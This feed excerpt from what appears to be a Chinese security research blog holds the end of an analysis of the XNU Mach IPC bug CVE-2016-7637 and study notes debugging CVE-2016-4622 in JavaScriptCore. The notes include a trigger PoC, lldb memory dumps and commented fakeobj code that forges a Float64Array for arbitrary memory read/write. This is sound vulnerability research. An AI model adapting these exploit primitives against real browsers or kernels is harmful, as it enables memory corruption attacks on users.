<p>就可以得到漏洞触发时的情况。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/%E8%A7%A6%E5%8F%91.png" alt=""></p>
<h2 id="2-4_port替换的原理是什么?">2.4  port替换的原理是什么?</h2><p>port是通过<code>port name</code>在task中来获取的。在前文中提到，<code>namep</code>是通过函数<code>ipc_entry_alloc</code>来获取的。查看获取到<code>namep</code>的核心代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">ipc_entry_claim(</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	*namep,</span><br><span class="line">	<span class="keyword">ipc_entry_t</span>		*entryp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">ipc_entry_t</span> entry;</span><br><span class="line">	<span class="keyword">ipc_entry_t</span> table;</span><br><span class="line">	<span class="keyword">mach_port_index_t</span> first_free;</span><br><span class="line">	<span class="keyword">mach_port_gen_t</span> gen;</span><br><span class="line">	<span class="keyword">mach_port_name_t</span> new_name;</span><br><span class="line"></span><br><span class="line">	table = &amp;space-&gt;is_table[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">	first_free = table-&gt;ie_next;</span><br><span class="line">	assert(first_free != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	entry = &amp;table[first_free];  <span class="comment">//[1]</span></span><br><span class="line">	table-&gt;ie_next = entry-&gt;ie_next;</span><br><span class="line">	space-&gt;is_table_free--;</span><br><span class="line"></span><br><span class="line">	assert(table-&gt;ie_next &lt; space-&gt;is_table_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 *	Initialize the new entry.  We need only</span><br><span class="line">	 *	increment the generation number and clear ie_request.</span><br><span class="line">	 */</span></span><br><span class="line">	gen = IE_BITS_NEW_GEN(entry-&gt;ie_bits); <span class="comment">//[2]</span></span><br><span class="line">	entry-&gt;ie_bits = gen;</span><br><span class="line">	entry-&gt;ie_request = IE_REQ_NONE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 *	The new name can't be MACH_PORT_NULL because index</span><br><span class="line">	 *	is non-zero.  It can't be MACH_PORT_DEAD because</span><br><span class="line">	 *	the table isn't allowed to grow big enough.</span><br><span class="line">	 *	(See comment in ipc/ipc_table.h.)</span><br><span class="line">	 */</span></span><br><span class="line">	new_name = MACH_PORT_MAKE(first_free, gen); <span class="comment">//[3]</span></span><br><span class="line">	assert(MACH_PORT_VALID(new_name));</span><br><span class="line">	*namep = new_name;</span><br><span class="line">	*entryp = entry;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过[1]可以看到，正如2.2节提到的一样，<code>entry</code>在<code>table</code>中的<code>index</code>是不变的。</p>
<p>通过[2]可以看到，每次使用<code>entry</code>来存放一个新<code>port</code>时，<code>gen</code>的值会加1。</p>
<p>通过[3]可以看到，<code>namep</code>就是通过这两个参数生成的。</p>
<p>因为<code>index</code>是不变的，所以在通过漏洞释放target_port之后，不断的对目标<code>entry</code>进行申请和释放，就可以通过整形溢出，使得<code>gen</code>变成和taget_port释放之前使用的entry相同。</p>
<p>那么就实现了在<code>port_name</code>不变的情况下替换了<code>port</code>的内核对象。</p>
<h1 id="0x03_小结">0x03 小结</h1><p>通过CVE-2016-7637的分析和研究加深了对<code>port</code>这个数据结构的理解，并且通过对<code>poc</code>的分析，体现了一个<code>port</code>在单个<code>task</code>中的状态变化，实际上是<code>ipc_space</code>和<code>ipc_entry</code>状态变化。</p>
<p>接下来就要分析学习CVE-2016-7644，通过对CVE-2016-7644的分析学习，可以更加深入的理解port在内核中状态的变化。也就是<code>port</code>自身的<code>port-&gt;srights</code>和<code>io_reference</code>的状态变化及漏洞的利用。</p>
<h1 id="参考">参考</h1><ol>
<li>《Mac OS X Internals》</li>
</ol>
<ol>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=959&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">Broken kernel mach port name uref</a></li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>为学大病在好名。</p>
</blockquote>
<h1 id="0x00_摘要">0x00 摘要</h1><p>​    去年在分析<a href="http://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/">CVE-2016-1757</a>时，初步的接触了<code>Mach</code>在<code>IPC</code>系统中使用的<code>Message</code>，在分析最近的一系列与<code>IPC</code>模块相关的漏洞时，又加强对<code>IPC</code>模块的理解，所以通过一到两篇文章梳理一下最近的学习总结与心得体会。</p>
<p>​    关于<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7637">CVE-2016-7637</a>这个漏洞的描述有很多资料了，是一个攻击<code>Mach</code>的内核<code>IPC</code>模块的漏洞，本文最后会对漏洞做出比较详细的解释，这里给出几个链接，不熟悉这个漏洞的读者可以先了解一下。</p>
<p>​    <a href="https://jaq.alibaba.com/community/art/show?articleid=687">黑云压城城欲摧 - 2016年iOS公开可利用漏洞总结</a></p>
<p>​    <a href="http://blog.pangu.io/mach-portal-details/">mach portal漏洞利用的一些细节</a></p>
<p>​    <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=959&amp;can=1&amp;q=apple&amp;sort=-id">Broken kernel mach port name uref</a></p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="IPC" scheme="http://turingh.github.io/tags/IPC/"/>
    
      <category term="MACH" scheme="http://turingh.github.io/tags/MACH/"/>
    
      <category term="XNU" scheme="http://turingh.github.io/tags/XNU/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/CVE/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-4622调试笔记(PART II)]]></title>
    <link href="http://turingh.github.io/2016/12/07/CVE-2016-4622%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0PART2/"/>
    <id>http://turingh.github.io/2016/12/07/CVE-2016-4622调试笔记PART2/</id>
    <published>2016-12-07T21:09:48.000Z</published>
    <updated>2016-12-08T02:39:52.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p> 本文基于<a href="phrack@saelo.net">saelo</a>在 <a href="http://phrack.org" target="_blank" rel="external">phrack</a>上发表的<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">Attacking JavaScript Engines</a>一文，记录了调试的过程。</p>
<p><a href="https://github.com/saelo/jscpwn" target="_blank" rel="external">POC</a></p>
<p><a href="http://turingh.github.io/2016/12/03/CVE-2016-4622%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/">CVE-2016-4622调试笔记</a>记录最基本的漏洞触发过程的调试。</p>
<p>本文记录更高级利用技巧的调试过程。</p>
<a id="more"></a>
<h1 id="0x01_数据结构">0x01 数据结构</h1><h2 id="1-1_JSCell_&amp;&amp;_JSObject">1.1 JSCell &amp;&amp; JSObject</h2><p>通过阅读源码<code>JSCell</code>的结构中的成员变量如下所示：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> JSCell &#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> JSValue;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> MarkedBlock;</span><br><span class="line">    <span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span>* <span class="title">allocateCell</span><span class="params">(Heap&amp;)</span></span>;</span><br><span class="line">    <span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span>* <span class="title">allocateCell</span><span class="params">(Heap&amp;, size_t)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> LLIntOffsetsExtractor;</span><br><span class="line"></span><br><span class="line">    StructureID m_structureID;</span><br><span class="line">    IndexingType m_indexingType;</span><br><span class="line">    JSType m_type;</span><br><span class="line">    TypeInfo::InlineTypeFlags m_flags;</span><br><span class="line">    <span class="keyword">uint8_t</span> m_gcData;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>JSCell</code>一共有5个成员变量，具体每个变量有什么用，在saelo的文章中介绍的很清楚，在<code>5.2 - JSObject internals</code>一节中。</p>
<p>通过阅读源码<code>JSObject</code>的结构中成员变量如下所示：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> JSObject : <span class="keyword">public</span> JSCell &#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> BatchedTransitionOptimizer;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> JIT;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> JSCell;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> JSFinalObject;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> MarkedBlock;</span><br><span class="line">    <span class="function">JS_EXPORT_PRIVATE <span class="keyword">friend</span> <span class="keyword">bool</span> <span class="title">setUpStaticFunctionSlot</span><span class="params">(ExecState*, <span class="keyword">const</span> HashTableValue*, JSObject*, PropertyName, PropertySlot&amp;)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">enum</span> PutMode &#123;</span><br><span class="line">        PutModePut,</span><br><span class="line">        PutModeDefineOwnProperty,</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="comment">/*....*/</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    CopyWriteBarrier&lt;Butterfly&gt; m_butterfly;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> USE(JSVALUE32_64)</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">uint32_t</span> m_padding;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>JSObject</code>只有一个成员变量<code>m_butterfly</code>，存储<code>JSObject</code>中存储的数据。</p>
<p>通过<code>lldb</code>调试<code>poc.js</code>，验证源码分析的结论。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">	a.push(i + <span class="number">0.123</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = a.slice(<span class="number">0</span>, &#123;valueOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; a.length = <span class="number">0</span>; <span class="keyword">return</span> <span class="number">10</span>; &#125;&#125;);</span><br><span class="line">print (b);</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p this&#10;(JSC::JSArray *) $0 = 0x0000000106fc7ed0&#10;(lldb) memory read --format x --size 8 --count 10 0x0000000106fc7ed0&#10;0x106fc7ed0: 0x010814070000004d 0x00000001069e4170&#10;0x106fc7ee0: 0x010814030000004b 0x00000001069e4148&#10;0x106fc7ef0: 0x01081400000000b9 0x00000001069e3028&#10;0x106fc7f00: 0x01081400000000b8 0x00000001069e2b48&#10;0x106fc7f10: 0x01001400000000b7 0x00000001069e2a68&#10;(lldb) p *this&#10;(JSC::JSArray) $1 = &#123;&#10;  JSC::JSNonFinalObject = &#123;&#10;    JSC::JSObject = &#123;&#10;      JSC::JSCell = &#123;&#10;        m_structureID = 77&#10;        m_indexingType = &#39;\a&#39;&#10;        m_type = ObjectType&#10;        m_flags = &#39;\b&#39;&#10;        m_cellState = NewWhite&#10;      &#125;&#10;      m_butterfly = &#123;&#10;        JSC::CopyBarrierBase = (m_value = 0x00000001069e4170)&#10;      &#125;&#10;    &#125;&#10;  &#125;&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到第一个<code>dword</code>就是<code>JSCell</code>的内容(<code>0x010814070000004d</code>)，第二个<code>dword</code>就是<code>m_butterfly</code>的内容(<code>0x00000001069e4170</code>)。</p>
<p><code>0x010814070000004d</code>可以通过这个数据结构来解析：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            StructureID structureID;</span><br><span class="line">            IndexingType indexingType;</span><br><span class="line">            JSType type;</span><br><span class="line">            TypeInfo::InlineTypeFlags inlineTypeFlags;</span><br><span class="line">            JSCell::GCData defaultGCData;</span><br><span class="line">        &#125; fields;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            <span class="keyword">int32_t</span> word1;</span><br><span class="line">            <span class="keyword">int32_t</span> word2;</span><br><span class="line">        &#125; words;</span><br><span class="line">        <span class="keyword">int64_t</span> doubleWord;</span><br><span class="line">    &#125; u;</span><br></pre></td></tr></table></figure>
<h2 id="1-2_JSObject_internals">1.2 JSObject internals</h2><p>如果一个<code>JSObject</code>的成员少于6个(默认情况)，就不会去使用<code>butterfly</code>存储数据，而是紧跟着<code>JSObject</code>的数据结构线性的存放在内存中。</p>
<p>通过调试如下代码，验证该特性。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj = &#123;<span class="string">'a'</span>: <span class="number">0x1337</span>, <span class="string">'b'</span>: <span class="literal">false</span>, <span class="string">'c'</span>: <span class="number">13.37</span>, <span class="string">'d'</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]&#125;;</span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(obj)</span><br></pre></td></tr></table></figure>
<p>在<code>JSObject::getOwnPropertyNames</code>函数处下断点，观察<code>obj</code>的内存结构。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process 76862 stopped&#10;* thread #1: tid = 0x2f6b12, 0x0000000100d01cca JavaScriptCore`JSC::JSObject::getOwnPropertyNames(object=0x00000001065d09d0, exec=0x00007fff5fbfd940, propertyNames=0x00007fff5fbfd890, mode=(m_dontEnumPropertiesMode = Include, m_jsObjectPropertiesMode = Include)) + 170 at JSObject.cpp:1789, queue = &#39;com.apple.main-thread&#39;, stop reason = step over&#10;    frame #0: 0x0000000100d01cca JavaScriptCore`JSC::JSObject::getOwnPropertyNames(object=0x00000001065d09d0, exec=0x00007fff5fbfd940, propertyNames=0x00007fff5fbfd890, mode=(m_dontEnumPropertiesMode = Include, m_jsObjectPropertiesMode = Include)) + 170 at JSObject.cpp:1789&#10;   1786&#9;        return;&#10;   1787&#9;    &#125;&#10;   1788&#10;-&#62; 1789&#9;    if (propertyNames.includeStringProperties()) &#123;&#10;   1790&#9;        // Add numeric properties first. That appears to be the accepted convention.&#10;   1791&#9;        // FIXME: Filling PropertyNameArray with an identifier for every integer&#10;   1792&#9;        // is incredibly inefficient for large arrays. We need a different approach,&#10;(lldb) p this&#10;error: invalid use of &#39;this&#39; outside of a non-static member function&#10;(lldb) memory read --format x --size 8 --count 10 0x00000001065d09d0&#10;0x1065d09d0: 0x01001500000000f4 0x0000000000000000&#10;0x1065d09e0: 0xffff000000001337 0x0000000000000006&#10;0x1065d09f0: 0x402bbd70a3d70a3d 0x00000001065c7ee0&#10;0x1065d0a00: 0x010a1700000000ee 0x0000000105fe4148&#10;0x1065d0a10: 0x00000001065e7900 0x00000001065a65c0</span><br></pre></td></tr></table></figure>
<p>其结果确实如<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">writeup</a>中所述。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x1065d09d0: 0x01001500000000f4 0x0000000000000000 //jscell,m_butterfly&#10;0x1065d09e0: 0xffff000000001337 0x0000000000000006 //0x1337,false&#10;0x1065d09f0: 0x402bbd70a3d70a3d 0x00000001065c7ee0 //13.37,[1,2,3,4]&#36825;&#20010;&#25968;&#32452;&#30340;&#22320;&#22336;&#12290;</span><br></pre></td></tr></table></figure>
<h2 id="1-3_StructureID">1.3 StructureID</h2><p><code>JSCell</code>结构体中的<code>m_structureID</code>会在<code>JS</code>的虚拟机中索引到对应的<code>Structure</code>的数据结构，在<code>JavaScript</code>中<code>Structure</code>用来存储<code>Object</code>的<code>Class</code>的信息，包括<code>object</code>中的属性。</p>
<p>在<code>Structure</code>的头文件中定义出如下。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ClassInfo* m_classInfo;</span><br></pre></td></tr></table></figure>
<p>在<code>ClassInfo</code>的定义中，<code>MethodTable</code>定义了一系列的函数指针，针对不同类型的<code>Object</code>，会有不同的实现。</p>
<p>所以在伪造<code>Object</code>的时候需要一个正确的<code>StructureID</code>，否则在调用<code>MethodTable</code>中的函数的时会导致崩溃。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> ClassInfo &#123;</span><br><span class="line">    <span class="comment">// A string denoting the class name. Example: "Window".</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* className;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pointer to the class information of the base class.</span></span><br><span class="line">    <span class="comment">// nullptrif there is none.</span></span><br><span class="line">    <span class="keyword">const</span> ClassInfo* parentClass;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSubClassOf</span><span class="params">(<span class="keyword">const</span> ClassInfo* other)</span> <span class="keyword">const</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> ClassInfo* ci = <span class="keyword">this</span>; ci; ci = ci-&gt;parentClass) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ci == other)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasStaticProperties</span><span class="params">()</span> <span class="keyword">const</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> ClassInfo* ci = <span class="keyword">this</span>; ci; ci = ci-&gt;parentClass) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ci-&gt;staticPropHashTable)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasStaticSetterOrReadonlyProperties</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> HashTable* staticPropHashTable;</span><br><span class="line"></span><br><span class="line">    MethodTable methodTable;</span><br><span class="line"></span><br><span class="line">    TypedArrayType typedArrayStorageType;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="1-4_JSArrayBufferView">1.4 JSArrayBufferView</h2><p>在伪造<code>Object</code>的时候使用的是<code>Float64Array</code>，在<code>JSC</code>引擎中的实现是<code>JSArrayBufferView</code>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> JSArrayBufferView : <span class="keyword">public</span> JSNonFinalObject &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> JSNonFinalObject Base;</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">        <span class="keyword">void</span>* m_vector;</span><br><span class="line">    <span class="keyword">uint32_t</span> m_length;</span><br><span class="line">    TypedArrayMode m_mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>继承<code>JSObject</code>又添加了三个成员变量。<code>m_vector</code>存储了具体的数据。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+----------------+&#10;| Float64Array   |&#10;+----------------+&#10;|  JSCell        |&#10;|  butterfly     |&#10;|  vector        |&#10;|  length        |&#10;|  mode          |&#10;+----------------+</span><br></pre></td></tr></table></figure>
<h1 id="0x02_FakeObject">0x02 FakeObject</h1><p>伪代码如下，具体细节可以看<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">Attacking JavaScript Engines</a>一文，这里添加一些注释更详细的解释。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">sprayFloat64ArrayStructures(); <span class="comment">//随机创建n个Float64Array的数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the array that will be used to</span></span><br><span class="line"><span class="comment">// read and write arbitrary memory addresses.</span></span><br><span class="line"><span class="keyword">var</span> hax = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> jsCellHeader = <span class="keyword">new</span> Int64([</span><br><span class="line">    <span class="number">00</span>, <span class="number">0x10</span>, <span class="number">00</span>, <span class="number">00</span>,  <span class="comment">// m_structureID, current guess</span></span><br><span class="line">    <span class="number">0x0</span>,               <span class="comment">// m_indexingType</span></span><br><span class="line">    <span class="number">0x27</span>,              <span class="comment">// m_type, Float64Array</span></span><br><span class="line">    <span class="number">0x18</span>,              <span class="comment">// m_flags, OverridesGetOwnPropertySlot |</span></span><br><span class="line">                       <span class="comment">// InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero           </span></span><br><span class="line">    <span class="number">0x1</span>                <span class="comment">// m_cellState, NewWhite</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里的container类比于1.2小节中的obj。构建了一个叫做container的object。</span></span><br><span class="line"><span class="comment">//jsCellHeader、butterfly、vector、lengthAndFlags</span></span><br><span class="line"><span class="comment">//这些都是container线性存储在m_butterfly指针后的数据。</span></span><br><span class="line"><span class="keyword">var</span> container = &#123;</span><br><span class="line">    jsCellHeader: jsCellHeader.encodeAsJSVal(),</span><br><span class="line">    butterfly: <span class="literal">false</span>,       <span class="comment">// Some arbitrary value</span></span><br><span class="line">    vector: hax,</span><br><span class="line">    lengthAndFlags: (<span class="keyword">new</span> Int64(<span class="string">'0x0001000000000010'</span>)).asJSValue()</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the fake Float64Array.</span></span><br><span class="line"><span class="keyword">var</span> address = Add(addrof(container), <span class="number">16</span>);</span><br><span class="line"><span class="comment">// container的地址加16，是为了跳过JSCell的值和m_butterfly的指针。</span></span><br><span class="line"><span class="keyword">var</span> fakearray = fakeobj(address);</span><br><span class="line"><span class="comment">// fakearry就死通过fakeobj获取到的伪造的object</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ps:</span></span><br><span class="line"><span class="comment">//addrof和fakeobj本文不做赘述，细节在Attacking JavaScript Engines原文中有详细描述。</span></span><br><span class="line"><span class="comment">//获取object的地址，通过地址获取fakeobj</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Find the correct structure ID.</span></span><br><span class="line"><span class="comment">// 通过对比寻找Float64Array对应的structure ID</span></span><br><span class="line"><span class="keyword">while</span> (!(fakearray <span class="keyword">instanceof</span> <span class="built_in">Float64Array</span>)) &#123;</span><br><span class="line">    jsCellHeader.assignAdd(jsCellHeader, Int64.One);</span><br><span class="line">    container.jsCellHeader = jsCellHeader.encodeAsJSVal();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过lldb观察<code>container</code>的地址。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read --format x --size 8 --count 10 0x0000000106c1e170&#10;0x106c1e170: 0x0100150000001134 0x0000000000000000   --&#62;JSCell,m_butterfly=NULL&#10;0x106c1e180: 0x0118270000001000 0x0000000000000006   --&#62;jsCellHeader&#65292;butterfly=false&#10;0x106c1e190: 0x0000000106c173c0 0x0001000000000010   --&#62;vector=hax,lengthAndFlags&#10;0x106c1e1a0: 0x010a170000000031 0x0000000000000000&#10;0x106c1e1b0: 0x0000000106c1e1d0 0x0000000106d8bd80</span><br></pre></td></tr></table></figure>
<p>就和之前提到的一样，因为属性少于6个，m_butterfly是NULL。</p>
<p>通过lldb观察<code>fakearray</code>的地址。</p>
